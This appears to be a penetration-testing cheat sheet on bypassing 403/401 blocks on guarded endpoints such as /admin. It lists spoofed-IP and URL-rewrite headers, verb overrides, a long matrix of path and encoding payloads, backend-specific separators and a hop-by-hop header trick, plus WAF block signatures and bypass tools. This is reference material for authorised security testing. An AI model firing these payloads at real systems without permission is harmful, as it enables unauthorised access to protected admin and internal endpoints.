## 403 / 401 Bypass — reach the endpoint the edge is guarding
When a path (`/admin`, `/api/internal`, `/actuator`) returns 403/401, the block is often only at a
front proxy or a naive path rule; the origin still serves it. Fire a small matrix and diff responses.

IP-spoof headers (edge trusts them for internal/allowlist gating) — set to `127.0.0.1` or `localhost`:
`X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `CF-Connecting-IP`, `X-Originating-IP`,
`X-Client-IP`, `X-Remote-IP`, `X-Remote-Addr`, `X-ProxyUser-Ip`, `Client-IP`,
`Forwarded: for=127.0.0.1`, `Via: 1.1 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`.

URL-rewrite headers (proxy routes on header, ACL matched the original path):
`X-Original-URL: /admin`, `X-Rewrite-URL: /admin` (send to `/` or an allowed path, header carries the
real target), `X-Forwarded-Host: localhost`.

Method tricks: swap verb `POST`/`PUT`/`PATCH`/`TRACE` on the same path; `X-HTTP-Method-Override: GET`
(or PUT) when only one verb is guarded.

Path / encoding tricks on the last segment (`/admin`): `/%2e/admin`, `/./admin`, `/.admin`,
`/admin/`, `/admin/.`, `/admin//`, `//admin`, `/admin;/`, `/admin/.;/`, `/admin..;/`, `/admin;/`,
`/admin%20`, `/admin%09`, `/admin%00`, `/admin#`, `/admin?`. Suffix confusion: `/admin.json`,
`/admin.html`, `/admin.css` (route matches, ACL keyed on exact string). Encoded slash/dot:
`/admin%2f`, `/admin%252f`, `/admin/%252e/`, unicode overlong `/%c0%2e/admin`, `/%c0%af`.

Backend-specific separators NGINX forwards but the app treats as a terminator (ACL/app mismatch):
Node/Express `\xA0` (NBSP) `/admin\xA0`; Flask `\x85`,`\xA0`; Spring Boot `;` `/admin;` and `\x09`;
PHP-FPM path-info `/admin.php/index.php`; Spring <5.3 suffix match `/admin.anything`.

Protocol-level: hop-by-hop strip — list a header in `Connection:` so an intermediary removes it before
the backend (`Connection: X-Forwarded-For` + forged XFF → backend sees no IP → defaults allow).

Verdict (200 != bypass — WAFs serve block pages with 200): confirm only if body diverges from a
known-block baseline (sample host with an obvious `?x=<script>alert(1)</script>` first) AND body has no
vendor block signature (`cf-challenge-form`, `Support ID:`, `_Incapsula_Resource`, `[id "942100"]`,
`mod_security`, `The requested URL was rejected`). Positive signals: `401` = reached auth middleware
past the edge; `500` = payload hit backend (SQLi/SSTI lead); `502/503` = reached origin.
A hit on a guarded path is itself a Security Misconfiguration finding — then escalate what it exposes.
Tools: `byp4xx -u URL`, `nomore403`, or ffuf the header/path list. Grab WAF Log IDs (`CF-Ray`,
ModSecurity rule id) for the report. See also [[waf_bypass_payloads]], [[param_discovery]].
